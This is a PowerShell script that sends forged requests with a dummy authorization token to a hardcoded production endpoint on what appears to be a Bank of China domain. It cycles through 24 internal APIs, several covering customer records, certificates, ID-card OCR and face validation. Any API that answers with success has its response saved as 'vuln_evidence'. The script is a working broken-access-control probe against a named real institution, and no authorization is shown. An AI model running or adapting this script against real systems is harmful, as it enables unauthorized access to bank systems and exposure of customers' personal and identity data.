$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "Continue"

# APIs to test for unauthorized access - using the exact same format as batch_test3.ps1
$apis = @(
    "SSP-AUTH/queryMenuTreeBySysIdRoleIdWithGuest",
    "CHANNEL/getPlatformBaseInfoList",
    "AGRE-AGRE/queryAgreementTypeList",
    "CUST-INFO/getGeoData",
    "SSP-AUTH/queryMenuTreeBySysIdRoleId",
    "SSP-AUTH/queryActionPermissionByMenuIdRoleId",
    "AGRE-AGRE/queryAgreementTemplateList",
    "AGRE-AGRE/getAgreementInfo",
    "CUST-INFO/selectPersonCust",
    "CUST-INFO/queryCustomerAssetArray",
    "CUST-INFO/queryPrepaidMerchantBaseInfo",
    "CUST-INFO/queryCustComponentDetail",
    "CUST-INFO/findListPartyIdentificationAuth",
    "CUST-INFO/selectCustCertificateList",
    "EC-IDEN/queryOrderDetail",
    "EC-IDEN/getOcrIdCardResult",
    "EC-IDEN/idcardOCR",
    "EC-IDEN/getFaceValidate",
    "EC-IDEN/completionOrderInfo",
    "CHANNEL/shareDataStatAdd",
    "CHANNEL/shareInstProcess",
    "CHANNEL_MANAGE/validateChannel",
    "CUST-RELA/addPartyRelationshipBasicInfo",
    "CUST-CSER/acCreateCommunicationEventResult"
)

$outDir = "e:\BaiduNetdiskDownload\1\vuln_evidence"
if (-not (Test-Path $outDir)) { New-Item -ItemType Directory -Path $outDir | Out-Null }

$successApis = @()
$idx = 0
foreach ($api in $apis) {
    $idx++
    $parts = $api -split '/'
    $service = $parts[1]
    $body = @{
        Header = @{
            CurrentPageNum = 1
            PageTotalNum = 10
            NoRetCode = $true
            BranchId = "800000"
            LegalRepCode = "10000"
            TranTeller = ""
            TranCode = $api
            TranDate = "20260716"
            TranTime = "004500000"
            ServiceName = $service
            ServiceCode = "D20190130"
            AuthFlag = "0"
            AuthrTellerNo = "1"
            Channel = "39"
            ConsumerId = "1"
            GlobalSeq = "1"
            GlobalSeqNo = "1"
            KeyId = "1"
            LocalLang = "1"
            Mac = "1"
            SourceSysId = "1111"
            TerminalCode = "1121"
            TranSeq = "1"
            TranSeqNo = "1"
            TranTellerNo = "1"
            ExtendContent = "1"
            TotalNum = "0"
        }
    } | ConvertTo-Json -Depth 5 -Compress

    $tempFile = [System.IO.Path]::GetTempFileName()
    [System.IO.File]::WriteAllText($tempFile, $body)

    $safeName = $api -replace "[/\\]", "_"
    $respFile = Join-Path $outDir ("resp_" + $safeName + ".json")

    $resp = curl.exe -sk --noproxy "*" --max-time 15 -X POST "https://dl.brcloud.bankofchina.com/dlydjd/sgp/transferRequest" -H "Content-Type: application/json" -H "Authorization: 987654321" --data-binary "@$tempFile" -o $respFile -w "HTTP_CODE:%{http_code} SIZE:%{size_download}" 2>&1
    Remove-Item $tempFile -Force

    $content = ""
    if (Test-Path $respFile) { $content = Get-Content $respFile -Raw -Encoding utf8 }

    $retCode = ""
    $retMsg = ""
    if ($content -match '"RetCode":"([^"]*)"') { $retCode = $Matches[1] }
    if ($content -match '"RetMsg":"([^"]*)"') { $retMsg = $Matches[1] }

    $status = if ($retCode -eq "000000") { "SUCCESS" } elseif ($retCode) { "ERR:$retCode" } else { "HTTP_ERR" }
    Write-Host ("[{0}/{1}] {2} => {3} | RetCode={4} RetMsg={5} | Size={6}" -f $idx, $apis.Count, $api, $status, $retCode, $retMsg, $content.Length)

    if ($retCode -eq "000000") {
        $successApis += $api
        # Save the response as evidence
        $preview = if ($content.Length -gt 200) { $content.Substring(0,200) + "..." } else { $content }
        Write-Host "    >>> SUCCESS! Saved to $respFile"
        Write-Host "    Preview: $preview"
    }
    Write-Host ""
    Start-Sleep -Milliseconds 300
}

Write-Host "`n========== SUMMARY =========="
Write-Host "Total APIs tested: $($apis.Count)"
Write-Host "Successful (RetCode=000000): $($successApis.Count)"
Write-Host "Successful APIs:"
foreach ($a in $successApis) { Write-Host "  - $a" }
Write-Host "============================="
